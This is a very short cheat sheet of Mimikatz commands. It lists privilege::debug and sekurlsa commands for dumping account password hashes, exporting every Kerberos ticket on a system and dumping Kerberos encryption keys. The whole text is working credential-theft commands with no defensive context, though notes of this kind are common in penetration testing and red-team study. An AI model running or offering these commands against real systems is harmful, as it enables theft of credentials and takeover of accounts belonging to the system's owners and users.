

List hashes for all user accounts
	sekurlsa::logonPasswords full
Harvest all kerberos tickets on the system(```cmd-session
privilege::debug
```)
	sekurlsa::tickets /export
Dump all kerberos encryption keys
	sekurlsa::ekeys